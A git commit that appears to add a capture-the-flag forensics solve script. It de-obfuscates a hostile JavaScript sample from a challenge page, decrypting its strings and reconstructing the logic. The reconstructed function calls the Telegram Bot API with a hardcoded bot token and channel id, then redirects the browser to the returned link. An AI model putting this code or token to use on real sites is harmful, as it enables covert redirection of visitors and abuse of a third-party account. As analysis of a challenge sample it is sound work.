09ec16b531069eba084ec9b6a62a619ad1f278e8
Michael Zhang <mail@mzhang.io>
2025-03-25 03:16:32 +0000

    tales for the brave progress

---
+++ forensics/tales-for-the-brave/script2.js
@@ -0,0 +1,165 @@
+import CryptoJS from "crypto-js";
+
+let sequence = [];
+
+var strings = [
+    "submit",
+    "preventDefault",
+    "email",
+    "getElementById",
+    "descriptionField",
+    "value",
+    "shake",
+    "add",
+    "classList",
+    "remove",
+    "@",
+    "split",
+    "log",
+    "addEventListener",
+    "newsletterForm",
+];
+
+console.log(
+    "strings",
+    strings.map((x, i) => [x, i]),
+);
+
+// document
+//     .getElementById("newsletterForm")
+//     .addEventListener("submit", function (e) {
+//         e.preventDefault();
+//         const emailField = document.getElementById("email");
+//         const descriptionField = document.getElementById("descriptionField");
+//         let isValid = true;
+//         if (!emailField.value) {
+//             emailField.classList.add("shake");
+//             isValid = false;
+//             setTimeout(() => {
+//                 return emailField.classList.remove("shake");
+//             }, 500);
+//         }
+//         if (!isValid) {
+//             return;
+//         }
+//         const emailValue = emailField.value;
+//         const specialKey = emailValue.split("@")[0];
+//         const desc = parseInt(descriptionField.value, 10);
+//         f(specialKey, desc);
+//     });
+
+function G(r) {
+    return "0p3r4" + "t10n" + "_" + "4PT_Un10n";
+}
+
+var s = [
+    "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==",
+    "s3cur3k3y",
+    "Base64",
+    "enc",
+    "toString",
+    "",
+    "join",
+    "SHA256",
+    "18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=",
+    "Utf8",
+    "parse",
+    "decrypt",
+    "RC4Drop",
+    "https://api.telegram.org",
+    "fromCharCode",
+    "onreadystatechange",
+    "readyState",
+    "DONE",
+    "responseText",
+    "text",
+    "result",
+    "log",
+    "replace",
+    "location",
+    "Form submitted!",
+    "GET",
+    "forwardMessage?chat_id=",
+    "&from_chat_id=",
+    "&message_id=5",
+    "open",
+    "send",
+];
+
+console.log(CryptoJS[s[7]](sequence[s[6]](s[5]))[s[4]](CryptoJS[s[3]][s[2]]));
+console.log("sequence", sequence, s[6], s[8]);
+
+console.log(
+    CryptoJS[s[12]]
+        [
+            s[11]
+        ](s[0], CryptoJS[s[3]][s[9]][s[10]]("0p3r4t10n_4PT_Un10n"), { drop: 192 })
+        [s[4]](CryptoJS[s[3]][s[9]]),
+);
+var decrypted = "7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc";
+console.log(s[29]);
+const target = "18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=";
+
+const choices = ["c1", "c2", "c3", "c4"];
+const channel_id = -1002496072246;
+var HOST =
+    "https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc";
+console.log(
+    HOST + String[s[14]](0x2f) + s[26] + "{desc}" + s[27] + channel_id + s[28],
+);
+
+function f(specialKey, desc) {
+    var enc_token = s[0];
+    if (
+        specialKey === "0p3r4t10n_4PT_Un10n" &&
+        true
+        // desc === "c4c2c2c2c1c3c4c1"
+        // CryptoJS.SHA256(sequence.join("")).toString(CryptoJS.enc.Base64) ===
+        //     "18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g="
+    ) {
+        var decrypted = "7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc";
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+            if (xhr[s[16]] == XMLHttpRequest[s[17]]) {
+                const resp = JSON[s[10]](xhr[s[18]]);
+                try {
+                    const link = resp[s[20]][s[19]];
+                    window[s[23]][s[22]](link);
+                } catch (error) {
+                    alert(s[24]);
+                }
+            }
+        };
+        xhr[s[29]](
+            s[25],
+            HOST +
+                String[s[14]](0x2f) +
+                s[26] +
+                desc +
+                s[27] +
+                channel_id +
+                s[28],
+        );
+        xhr[s[30]](null);
+    } else {
+        alert(s[24]);
+    }
+}
+
+// var sequence = [];
+function l() {
+    sequence.push(this.id);
+}
+var wtf = [
+    "input[class=cb]",
+    "querySelectorAll",
+    "length",
+    "change",
+    "addEventListener",
+];
+console.log(wtf);
+
+// var checkboxes = document.querySelectorAll("input[class=cb]");
+// for (var i = 0; i < checkboxes.length; i++) {
+//     checkboxes[i].addEventListener("change", l);
+// }
